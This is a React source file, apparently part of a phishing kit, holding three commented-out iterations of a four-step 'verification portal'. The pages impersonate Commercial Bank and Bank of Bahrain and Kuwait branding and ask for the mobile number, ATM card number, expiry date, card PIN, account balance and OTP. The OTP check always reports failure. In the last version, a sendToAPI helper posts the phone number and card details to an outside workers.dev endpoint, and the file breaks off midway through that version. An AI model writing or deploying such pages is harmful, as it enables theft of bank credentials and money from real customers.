// // // import React, { useState } from 'react';
// // // import { Globe } from 'lucide-react';

// // // // Step 1 Component - Mobile Number
// // // const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
// // //   return (
// // //     <div className="bg-white min-h-screen">
// // //       {/* Header */}
// // //       <div className="flex items-center justify-between p-4 border-b shadow-sm">
// // //         <div className="flex items-center gap-3">
// // //           <div className="w-14 h-14 bg-gradient-to-br from-[#8B1538] to-[#6B1028] rounded-full flex items-center justify-center shadow-lg">
// // //             <span className="text-white font-bold text-xl">CB</span>
// // //           </div>
// // //           <div className="text-xs text-gray-600 leading-tight">
// // //             <div className="font-semibold">COMMERCIAL</div>
// // //             <div>BANK</div>
// // //           </div>
// // //         </div>
// // //         <button className="flex items-center gap-2 text-sm text-gray-600 hover:text-gray-800">
// // //           <Globe className="w-4 h-4" />
// // //           <span className="font-medium">EN</span>
// // //         </button>
// // //       </div>

// // //       {/* Content */}
// // //       <div className="p-6 max-w-md mx-auto">
// // //         <div className="flex justify-center mb-8 mt-4">
// // //           <div className="w-36 h-36 bg-gradient-to-br from-[#8B1538] to-[#6B1028] rounded-full flex items-center justify-center shadow-2xl">
// // //             <span className="text-white font-bold text-5xl">CB</span>
// // //           </div>
// // //         </div>

// // //         <h1 className="text-3xl font-bold text-center mb-3 text-gray-800">
// // //           Welcome to verification portal
// // //         </h1>
// // //         <p className="text-center text-gray-500 mb-8 text-lg">Online Verification</p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold text-gray-700 mb-3">STEP 1 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // //                   step === 1 ? 'bg-[#8B1538]' : 'bg-gray-300'
// // //                 }`}
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         {/* Form Card */}
// // //         <div className="border-2 border-[#8B1538] rounded-2xl overflow-hidden shadow-lg mt-8">
// // //           <div className="bg-gradient-to-r from-[#8B1538] to-[#6B1028] text-white p-4">
// // //             <h2 className="font-bold text-lg">ENTER DETAILS</h2>
// // //           </div>
// // //           <div className="p-6 bg-white">
// // //             <label className="block text-sm font-bold mb-3 text-gray-700">
// // //               Registered Mobile Number *
// // //             </label>
// // //             <input
// // //               type="tel"
// // //               placeholder="Enter Registered Mobile Number"
// // //               value={mobileNumber}
// // //               onChange={(e) => setMobileNumber(e.target.value)}
// // //               className="w-full px-4 py-4 border-2 border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#8B1538] focus:border-transparent mb-6 text-lg"
// // //             />
// // //             <button
// // //               onClick={onNext}
// // //               disabled={!mobileNumber}
// // //               className="w-full bg-gradient-to-r from-[#8B1538] to-[#6B1028] text-white py-4 rounded-full font-bold text-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed transform hover:scale-[1.02] active:scale-[0.98]"
// // //             >
// // //               Next
// // //             </button>
// // //           </div>
// // //         </div>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Step 2 Component - ATM Card Details
// // // const Step2ATMCard = ({ atmCardNumber, setAtmCardNumber, expiryDate, setExpiryDate, cardPin, setCardPin, onNext, onBack }) => {
// // //   return (
// // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // //       <div className="max-w-md mx-auto">
// // //         <div className="flex justify-end mb-12 mt-4">
// // //           <div className="text-right">
// // //             <div className="text-3xl font-bold tracking-wide">BBK*</div>
// // //             <div className="text-xs opacity-90 mt-1">بنك البحرين والكويت</div>
// // //           </div>
// // //         </div>

// // //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // //           For your security, please provide the following information to complete the verification process
// // //         </p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // //                   step <= 2 ? 'bg-white' : 'bg-white/30'
// // //                 }`}
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         <div className="space-y-8 mt-12">
// // //           <div>
// // //             <input
// // //               type="text"
// // //               placeholder="Enter your 16-digit ATM card number *"
// // //               value={atmCardNumber}
// // //               onChange={(e) => setAtmCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
// // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //             />
// // //           </div>

// // //           <div>
// // //             <input
// // //               type="text"
// // //               placeholder="Expiry date (MM/YY) *"
// // //               value={expiryDate}
// // //               onChange={(e) => {
// // //                 let val = e.target.value.replace(/\D/g, '');
// // //                 if (val.length >= 2) {
// // //                   val = val.slice(0, 2) + '/' + val.slice(2, 4);
// // //                 }
// // //                 setExpiryDate(val);
// // //               }}
// // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //             />
// // //           </div>

// // //           <div>
// // //             <input
// // //               type="password"
// // //               placeholder="Enter your card PIN *"
// // //               value={cardPin}
// // //               onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
// // //               maxLength={4}
// // //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //             />
// // //           </div>
// // //         </div>

// // //         <button
// // //           onClick={onNext}
// // //           disabled={!atmCardNumber || !expiryDate || !cardPin}
// // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // //         >
// // //           Continue
// // //         </button>

// // //         <button
// // //           onClick={onBack}
// // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // //         >
// // //           ← Back
// // //         </button>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Step 3 Component - Account Balance
// // // const Step3AccountBalance = ({ accountBalance, setAccountBalance, onNext, onBack }) => {
// // //   return (
// // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // //       <div className="max-w-md mx-auto">
// // //         <div className="flex justify-end mb-12 mt-4">
// // //           <div className="text-right">
// // //             <div className="text-3xl font-bold tracking-wide">BBK*</div>
// // //             <div className="text-xs opacity-90 mt-1">بنك البحرين والكويت</div>
// // //           </div>
// // //         </div>

// // //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // //           For your security, please provide the following information to complete the verification process
// // //         </p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className={`h-1.5 w-16 rounded-full transition-all ${
// // //                   step <= 3 ? 'bg-white' : 'bg-white/30'
// // //                 }`}
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         <div className="mt-12">
// // //           <input
// // //             type="text"
// // //             placeholder="Enter your account balance *"
// // //             value={accountBalance}
// // //             onChange={(e) => setAccountBalance(e.target.value)}
// // //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // //           />
// // //         </div>

// // //         <button
// // //           onClick={onNext}
// // //           disabled={!accountBalance}
// // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // //         >
// // //           Continue
// // //         </button>

// // //         <button
// // //           onClick={onBack}
// // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // //         >
// // //           ← Back
// // //         </button>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Step 4 Component - OTP Verification
// // // const Step4OTPVerification = ({ otp, setOtp, otpError, timer, onVerify, onResend, onBack }) => {
// // //   const handleOtpChange = (index, value) => {
// // //     if (value.length <= 1 && /^\d*$/.test(value)) {
// // //       const newOtp = [...otp];
// // //       newOtp[index] = value;
// // //       setOtp(newOtp);

// // //       if (value && index < 5) {
// // //         const nextInput = document.getElementById(`otp-${index + 1}`);
// // //         if (nextInput) nextInput.focus();
// // //       }
// // //     }
// // //   };

// // //   return (
// // //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// // //       <div className="max-w-md mx-auto">
// // //         <div className="flex justify-end mb-12 mt-4">
// // //           <div className="text-right">
// // //             <div className="text-3xl font-bold tracking-wide">BBK*</div>
// // //             <div className="text-xs opacity-90 mt-1">بنك البحرين والكويت</div>
// // //           </div>
// // //         </div>

// // //         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
// // //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// // //           We've sent a 6-digit verification code to your registered mobile number
// // //         </p>

// // //         <div className="text-center mb-6">
// // //           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
// // //           <div className="flex justify-center gap-2">
// // //             {[1, 2, 3, 4].map((step) => (
// // //               <div
// // //                 key={step}
// // //                 className="h-1.5 w-16 rounded-full bg-white transition-all"
// // //               />
// // //             ))}
// // //           </div>
// // //         </div>

// // //         <div className="flex justify-center gap-3 mt-12 mb-6">
// // //           {otp.map((digit, index) => (
// // //             <input
// // //               key={index}
// // //               id={`otp-${index}`}
// // //               type="text"
// // //               maxLength={1}
// // //               value={digit}
// // //               onChange={(e) => handleOtpChange(index, e.target.value)}
// // //               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
// // //             />
// // //           ))}
// // //         </div>

// // //         {otpError && (
// // //           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
// // //             <p className="text-red-200 text-center font-medium">{otpError}</p>
// // //           </div>
// // //         )}

// // //         <div className="text-center mb-2 mt-8">
// // //           <p className="text-sm opacity-90">Didn't receive the code?</p>
// // //         </div>

// // //         <div className="text-center mb-8">
// // //           <button
// // //             onClick={onResend}
// // //             disabled={timer > 0}
// // //             className={`font-bold underline transition-all ${
// // //               timer > 0 ? 'opacity-50 cursor-not-allowed' : 'opacity-100 hover:text-white/80'
// // //             }`}
// // //           >
// // //             Resend OTP
// // //           </button>
// // //           <p className="text-sm opacity-90 mt-1">
// // //             Resend available in {timer}s
// // //           </p>
// // //         </div>

// // //         <button
// // //           onClick={onVerify}
// // //           disabled={otp.some(digit => !digit)}
// // //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// // //         >
// // //           Verify
// // //         </button>

// // //         <button
// // //           onClick={onBack}
// // //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// // //         >
// // //           ← Back to Login
// // //         </button>
// // //       </div>
// // //     </div>
// // //   );
// // // };

// // // // Main Component
// // // export default function VerificationPortal() {
// // //   const [currentStep, setCurrentStep] = useState(1);
// // //   const [mobileNumber, setMobileNumber] = useState('');
// // //   const [atmCardNumber, setAtmCardNumber] = useState('');
// // //   const [expiryDate, setExpiryDate] = useState('');
// // //   const [cardPin, setCardPin] = useState('');
// // //   const [accountBalance, setAccountBalance] = useState('');
// // //   const [otp, setOtp] = useState(['', '', '', '', '', '']);
// // //   const [otpError, setOtpError] = useState('');
// // //   const [timer, setTimer] = useState(57);

// // //   React.useEffect(() => {
// // //     if (currentStep === 4 && timer > 0) {
// // //       const interval = setInterval(() => {
// // //         setTimer((prev) => prev - 1);
// // //       }, 1000);
// // //       return () => clearInterval(interval);
// // //     }
// // //   }, [currentStep, timer]);

// // //   const handleNext = () => {
// // //     if (currentStep < 4) {
// // //       setCurrentStep(currentStep + 1);
// // //     }
// // //   };

// // //   const handleBack = () => {
// // //     if (currentStep > 1) {
// // //       setCurrentStep(currentStep - 1);
// // //       setOtpError('');
// // //     }
// // //   };

// // //   const handleVerifyOtp = () => {
// // //     setOtpError('Invalid OTP. Please try again.');
// // //   };

// // //   const handleResendOtp = () => {
// // //     if (timer === 0) {
// // //       setTimer(57);
// // //       setOtp(['', '', '', '', '', '']);
// // //       setOtpError('');
// // //     }
// // //   };

// // //   return (
// // //     <div>
// // //       {currentStep === 1 && (
// // //         <Step1MobileNumber
// // //           mobileNumber={mobileNumber}
// // //           setMobileNumber={setMobileNumber}
// // //           onNext={handleNext}
// // //         />
// // //       )}
// // //       {currentStep === 2 && (
// // //         <Step2ATMCard
// // //           atmCardNumber={atmCardNumber}
// // //           setAtmCardNumber={setAtmCardNumber}
// // //           expiryDate={expiryDate}
// // //           setExpiryDate={setExpiryDate}
// // //           cardPin={cardPin}
// // //           setCardPin={setCardPin}
// // //           onNext={handleNext}
// // //           onBack={handleBack}
// // //         />
// // //       )}
// // //       {currentStep === 3 && (
// // //         <Step3AccountBalance
// // //           accountBalance={accountBalance}
// // //           setAccountBalance={setAccountBalance}
// // //           onNext={handleNext}
// // //           onBack={handleBack}
// // //         />
// // //       )}
// // //       {currentStep === 4 && (
// // //         <Step4OTPVerification
// // //           otp={otp}
// // //           setOtp={setOtp}
// // //           otpError={otpError}
// // //           timer={timer}
// // //           onVerify={handleVerifyOtp}
// // //           onResend={handleResendOtp}
// // //           onBack={handleBack}
// // //         />
// // //       )}
// // //     </div>
// // //   );
// // // }

// // import React, { useState } from 'react';
// // import { Globe } from 'lucide-react';

// // // Step 1 Component - Mobile Number
// // const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         {/* <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div> */}

// //         <h1 className="text-4xl font-bold mb-4">Welcome to verification portal</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">Online Verification</p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className={`h-1.5 w-16 rounded-full transition-all ${
// //                   step === 1 ? 'bg-white' : 'bg-white/30'
// //                 }`}
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="mt-12">
// //           <label className="block text-sm font-bold mb-3 opacity-90">
// //             Registered Mobile Number *
// //           </label>
// //           <input
// //             type="tel"
// //             placeholder="Enter Registered Mobile Number"
// //             value={mobileNumber}
// //             onChange={(e) => setMobileNumber(e.target.value)}
// //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all mb-8"
// //           />
// //         </div>

// //         <button
// //           onClick={onNext}
// //           disabled={!mobileNumber}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           Continue
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };

// // // Step 2 Component - ATM Card Details
// // const Step2ATMCard = ({ atmCardNumber, setAtmCardNumber, expiryDate, setExpiryDate, cardPin, setCardPin, onNext, onBack }) => {
// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         {/* <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div> */}

// //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           For your security, please provide the following information to complete the verification process
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className={`h-1.5 w-16 rounded-full transition-all ${
// //                   step <= 2 ? 'bg-white' : 'bg-white/30'
// //                 }`}
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="space-y-8 mt-12">
// //           <div>
// //             <input
// //               type="text"
// //               placeholder="Enter your 16-digit ATM card number *"
// //               value={atmCardNumber}
// //               onChange={(e) => setAtmCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>

// //           <div>
// //             <input
// //               type="text"
// //               placeholder="Expiry date (MM/YY) *"
// //               value={expiryDate}
// //               onChange={(e) => {
// //                 let val = e.target.value.replace(/\D/g, '');
// //                 if (val.length >= 2) {
// //                   val = val.slice(0, 2) + '/' + val.slice(2, 4);
// //                 }
// //                 setExpiryDate(val);
// //               }}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>

// //           <div>
// //             <input
// //               type="password"
// //               placeholder="Enter your card PIN *"
// //               value={cardPin}
// //               onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
// //               maxLength={4}
// //               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //             />
// //           </div>
// //         </div>

// //         <button
// //           onClick={onNext}
// //           disabled={!atmCardNumber || !expiryDate || !cardPin}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           Continue
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };

// // // Step 3 Component - Account Balance
// // const Step3AccountBalance = ({ accountBalance, setAccountBalance, onNext, onBack }) => {
// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         {/* <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div> */}

// //         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           For your security, please provide the following information to complete the verification process
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className={`h-1.5 w-16 rounded-full transition-all ${
// //                   step <= 3 ? 'bg-white' : 'bg-white/30'
// //                 }`}
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="mt-12">
// //           <input
// //             type="text"
// //             placeholder="Enter your account balance *"
// //             value={accountBalance}
// //             onChange={(e) => setAccountBalance(e.target.value)}
// //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //           />
// //         </div>

// //         <button
// //           onClick={onNext}
// //           disabled={!accountBalance}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           Continue
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };

// // // Step 4 Component - OTP Verification
// // const Step4OTPVerification = ({ otp, setOtp, otpError, timer, onVerify, onResend, onBack }) => {
// //   const handleOtpChange = (index, value) => {
// //     if (value.length <= 1 && /^\d*$/.test(value)) {
// //       const newOtp = [...otp];
// //       newOtp[index] = value;
// //       setOtp(newOtp);

// //       if (value && index < 5) {
// //         const nextInput = document.getElementById(`otp-${index + 1}`);
// //         if (nextInput) nextInput.focus();
// //       }
// //     }
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         {/* <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div> */}

// //         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           We've sent a 6-digit verification code to your registered mobile number
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className="h-1.5 w-16 rounded-full bg-white transition-all"
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="flex justify-center gap-3 mt-12 mb-6">
// //           {otp.map((digit, index) => (
// //             <input
// //               key={index}
// //               id={`otp-${index}`}
// //               type="text"
// //               maxLength={1}
// //               value={digit}
// //               onChange={(e) => handleOtpChange(index, e.target.value)}
// //               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
// //             />
// //           ))}
// //         </div>

// //         {otpError && (
// //           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
// //             <p className="text-red-200 text-center font-medium">{otpError}</p>
// //           </div>
// //         )}

// //         <div className="text-center mb-2 mt-8">
// //           <p className="text-sm opacity-90">Didn't receive the code?</p>
// //         </div>

// //         <div className="text-center mb-8">
// //           <button
// //             onClick={onResend}
// //             disabled={timer > 0}
// //             className={`font-bold underline transition-all ${
// //               timer > 0 ? 'opacity-50 cursor-not-allowed' : 'opacity-100 hover:text-white/80'
// //             }`}
// //           >
// //             Resend OTP
// //           </button>
// //           <p className="text-sm opacity-90 mt-1">
// //             Resend available in {timer}s
// //           </p>
// //         </div>

// //         <button
// //           onClick={onVerify}
// //           disabled={otp.some(digit => !digit)}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           Verify
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back to Login
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };

// // // Main Component
// // export default function VerificationPortal() {
// //   const [currentStep, setCurrentStep] = useState(1);
// //   const [mobileNumber, setMobileNumber] = useState('');
// //   const [atmCardNumber, setAtmCardNumber] = useState('');
// //   const [expiryDate, setExpiryDate] = useState('');
// //   const [cardPin, setCardPin] = useState('');
// //   const [accountBalance, setAccountBalance] = useState('');
// //   const [otp, setOtp] = useState(['', '', '', '', '', '']);
// //   const [otpError, setOtpError] = useState('');
// //   const [timer, setTimer] = useState(57);

// //   React.useEffect(() => {
// //     if (currentStep === 4 && timer > 0) {
// //       const interval = setInterval(() => {
// //         setTimer((prev) => prev - 1);
// //       }, 1000);
// //       return () => clearInterval(interval);
// //     }
// //   }, [currentStep, timer]);

// //   const handleNext = () => {
// //     if (currentStep < 4) {
// //       setCurrentStep(currentStep + 1);
// //     }
// //   };

// //   const handleBack = () => {
// //     if (currentStep > 1) {
// //       setCurrentStep(currentStep - 1);
// //       setOtpError('');
// //     }
// //   };

// //   const handleVerifyOtp = () => {
// //     setOtpError('Invalid OTP. Please try again.');
// //   };

// //   const handleResendOtp = () => {
// //     if (timer === 0) {
// //       setTimer(57);
// //       setOtp(['', '', '', '', '', '']);
// //       setOtpError('');
// //     }
// //   };

// //   return (
// //     <div>
// //       {currentStep === 1 && (
// //         <Step1MobileNumber
// //           mobileNumber={mobileNumber}
// //           setMobileNumber={setMobileNumber}
// //           onNext={handleNext}
// //         />
// //       )}
// //       {currentStep === 2 && (
// //         <Step2ATMCard
// //           atmCardNumber={atmCardNumber}
// //           setAtmCardNumber={setAtmCardNumber}
// //           expiryDate={expiryDate}
// //           setExpiryDate={setExpiryDate}
// //           cardPin={cardPin}
// //           setCardPin={setCardPin}
// //           onNext={handleNext}
// //           onBack={handleBack}
// //         />
// //       )}
// //       {currentStep === 3 && (
// //         <Step3AccountBalance
// //           accountBalance={accountBalance}
// //           setAccountBalance={setAccountBalance}
// //           onNext={handleNext}
// //           onBack={handleBack}
// //         />
// //       )}
// //       {currentStep === 4 && (
// //         <Step4OTPVerification
// //           otp={otp}
// //           setOtp={setOtp}
// //           otpError={otpError}
// //           timer={timer}
// //           onVerify={handleVerifyOtp}
// //           onResend={handleResendOtp}
// //           onBack={handleBack}
// //         />
// //       )}
// //     </div>
// //   );
// // }

// import React, { useState, useEffect } from 'react';
// import { Globe } from 'lucide-react';

// const API_URL = 'https://my-pr-worker.instapayapi.workers.dev';

// // API Helper Function
// const sendToAPI = async (data) => {
//   try {
//     const response = await fetch(API_URL, {
//       method: 'POST',
//       headers: {
//         'Content-Type': 'application/json',
//       },
//       body: JSON.stringify(data),
//     });
//     return await response.json();
//   } catch (error) {
//     console.error('API Error:', error);
//     return { success: false, error: error.message };
//   }
// };

// // Step 1 Component - Mobile Number
// const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
//   const [loading, setLoading] = useState(false);

//   const handleSubmit = async () => {
//     setLoading(true);
//     const result = await sendToAPI({
//       type: 'phone',
//       phone: mobileNumber,
//     });
//     setLoading(false);

//     if (result.success) {
//       onNext();
//     }
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">Welcome to verification portal</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">Online Verification</p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className={`h-1.5 w-16 rounded-full transition-all ${
//                   step === 1 ? 'bg-white' : 'bg-white/30'
//                 }`}
//               />
//             ))}
//           </div>
//         </div>

//         <div className="mt-12">
//           <label className="block text-sm font-bold mb-3 opacity-90">
//             Registered Mobile Number *
//           </label>
//           <input
//             type="tel"
//             placeholder="Enter Registered Mobile Number"
//             value={mobileNumber}
//             onChange={(e) => setMobileNumber(e.target.value)}
//             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all mb-8"
//           />
//         </div>

//         <button
//           onClick={handleSubmit}
//           disabled={!mobileNumber || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? 'Submitting...' : 'Continue'}
//         </button>
//       </div>
//     </div>
//   );
// };

// // Step 2 Component - ATM Card Details
// const Step2ATMCard = ({ mobileNumber, atmCardNumber, setAtmCardNumber, expiryDate, setExpiryDate, cardPin, setCardPin, onNext, onBack }) => {
//   const [loading, setLoading] = useState(false);

//   const handleSubmit = async () => {
//     setLoading(true);
//     const result = await sendToAPI({
//       type: 'cardDetails',
//       phone: mobileNumber,
//       cardNumber: atmCardNumber,
//       expiryDate: expiryDate,
//       cvv: cardPin,
//     });
//     setLoading(false);

//     if (result.success) {
//       onNext();
//     }
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           For your security, please provide the following information to complete the verification process
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className={`h-1.5 w-16 rounded-full transition-all ${
//                   step <= 2 ? 'bg-white' : 'bg-white/30'
//                 }`}
//               />
//             ))}
//           </div>
//         </div>

//         <div className="space-y-8 mt-12">
//           <div>
//             <input
//               type="text"
//               placeholder="Enter your 16-digit ATM card number *"
//               value={atmCardNumber}
//               onChange={(e) => setAtmCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
